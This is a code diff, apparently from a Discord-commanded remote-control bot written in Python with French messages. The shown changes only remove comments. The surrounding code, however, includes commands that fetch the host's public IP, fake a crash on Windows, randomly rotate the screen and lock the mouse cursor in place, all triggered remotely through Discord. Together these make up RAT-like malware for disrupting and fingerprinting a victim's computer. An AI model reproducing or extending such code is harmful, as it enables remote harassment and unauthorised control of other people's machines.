@@ -49,11 +49,10 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 def get_public_ip():
     try:
-        # Premier service pour récupérer l'IP publique
         response = requests.get("http://checkip.amazonaws.com")
         public_ip = response.text.strip()
         print(f"IP publique récupérée via checkip.amazonaws.com : {public_ip}")
-        if not public_ip:  # Si l'IP est vide, essayer un autre service
+        if not public_ip:
             response = requests.get("https://ipinfo.io/ip")
             public_ip = response.text.strip()
             print(f"IP publique récupérée via ipinfo.io : {public_ip}")
@@ -635,7 +634,7 @@ async def fake_crash(ctx):
     else:
         await ctx.send("❌ **Cette commande fonctionne uniquement sur Windows.**")
 
-flipping = False  # Variable globale pour arrêter le flip
+flipping = False 
 
 def set_screen_rotation(angle):
     try:
@@ -669,21 +668,21 @@ async def random_flip(ctx, duration: int = 30):
     end_time = asyncio.get_event_loop().time() + duration
 
     while flipping and asyncio.get_event_loop().time() < end_time:
-        angle = random.choice([0, 90, 180, 270])  # Choix aléatoire de l'angle
+        angle = random.choice([0, 90, 180, 270]) 
         set_screen_rotation(angle)
 
         await ctx.send(f"🔄 **Écran tourné à `{angle}°` !** (Prochaine rotation dans quelques secondes...)")
-        await asyncio.sleep(random.randint(3, 7))  # Pause aléatoire
+        await asyncio.sleep(random.randint(3, 7)) 
 
     flipping = False
-    set_screen_rotation(0)  # Remet l’écran normal à la fin
+    set_screen_rotation(0)  
     await ctx.send("✅ **Mode Random Flip terminé, écran remis en place !**")
 
 @bot.command()
 async def stop_flip(ctx):
     global flipping
     flipping = False
-    set_screen_rotation(0)  # Remet l'écran normal
+    set_screen_rotation(0) 
     await ctx.send("✅ **Mode Random Flip désactivé et écran remis en place !**")
     
 @bot.command()
@@ -729,12 +728,12 @@ async def disable_mouse(ctx, duration: int):
     await ctx.send(f"🛑 **Souris désactivée pendant {duration} secondes !**")
 
     mouse = Controller()
-    original_position = mouse.position  # Sauvegarde la position actuelle
+    original_position = mouse.position 
 
     def lock_mouse():
         start_time = time.time()
         while time.time() - start_time < duration:
-            mouse.position = original_position  # Remet la souris à sa place
+            mouse.position = original_position 
             time.sleep(0.1)
 
     threading.Thread(target=lock_mouse).start()
